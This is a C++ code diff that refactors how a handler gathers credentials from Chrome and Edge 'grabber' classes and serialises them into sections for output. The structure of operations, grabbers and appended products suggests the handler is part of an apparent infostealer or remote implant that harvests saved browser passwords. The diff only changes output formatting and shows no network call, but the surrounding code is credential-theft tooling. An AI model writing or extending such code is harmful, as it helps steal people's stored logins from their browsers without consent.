@@ -1,5 +1,6 @@
 ﻿#include "GetAllCredentialsHandler.hpp"
 
+#include "SerializableSection.hpp"
 #include "Trace.hpp"
 #include "../Grabbers/ChromeCredentialsGrabber.hpp"
 #include "../Grabbers/EdgeCredentialsGrabber.hpp"
@@ -14,18 +15,17 @@ GetAllCredentialsHandler::GetAllCredentialsHandler(std::unique_ptr<Event> operat
 
 std::wstring GetAllCredentialsHandler::format_source(const std::wstring& source)
 {
-	return source + L" Credentials:";
+	return std::wstring{L"[Credentials "} + source + L"]";
 }
 
-std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential, const size_t index)
+std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential)
 {
-	return Strings::concat(std::wstring(L"#"), Strings::to_wstring(index), std::wstring(L"\n"), credential.serialize());
+	return Strings::concat(std::wstring(L"#Credential"), std::wstring(L"\n"), credential.serialize());
 }
 
 void GetAllCredentialsHandler::run()
 {
-	static constexpr auto SUFFIX = L"\n";
-	std::wstring product;
+	std::vector<SerializableSection> sections;
 
 	for (const auto& grabber : make_grabbers())
 	{
@@ -36,23 +36,24 @@ void GetAllCredentialsHandler::run()
 		}
 		CATCH_AND_TRACE();
 
-		product.append(format_source(grabber->source()) + SUFFIX);
+		SerializableSection section{.name = format_source(grabber->source()), .objects = {}};
 
 		if (credentials.has_value())
 		{
-			for (size_t i = 0; i < credentials->size(); ++i)
-			{
-				product.append(format_credential((*credentials)[i], i) + SUFFIX);
-			}
+			section.objects.insert(
+				section.objects.end(),
+				std::make_move_iterator(credentials->begin()),
+				std::make_move_iterator(credentials->end())
+			);
 		}
 		else
 		{
-			product.append(std::wstring{L"[Not Supported]"} + SUFFIX);
+			section.objects.emplace_back(std::make_unique<NotSupported>());
 		}
 
-		product.append(SUFFIX);
+		sections.push_back(std::move(section));
 	}
-	append(std::make_unique<TextTypedProduct>(product));
+	append(std::make_unique<TextTypedProduct>(SerializableSection::serialize_sections(sections)));
 	finished();
 }
 
